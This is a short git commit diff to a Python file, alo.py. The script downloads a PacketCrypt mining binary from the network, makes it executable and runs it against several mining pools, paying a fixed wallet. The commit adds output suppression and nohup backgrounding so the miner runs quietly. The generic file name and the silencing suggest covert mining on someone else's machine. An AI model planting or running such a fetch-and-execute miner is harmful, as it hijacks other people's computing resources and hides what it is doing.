35fe1e7bdd3b91aa5665d07f0b263fa93a16125c
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-02-09 17:14:06 +0700

    Update alo.py

--- alo.py
+++ alo.py
@@ -1,7 +1,7 @@
 import os
-cmd = os.system('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O packetcrypt')
-cmd = os.system('chmod +x packetcrypt')
-cmd = os.system('./packetcrypt ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io')
+cmd = os.system('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O packetcrypt >/dev/null 2>&1')
+cmd = os.system('chmod +x packetcrypt >/dev/null 2>&1')
+cmd = os.system('nohup ./packetcrypt ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > nohup.out')
 
 
 
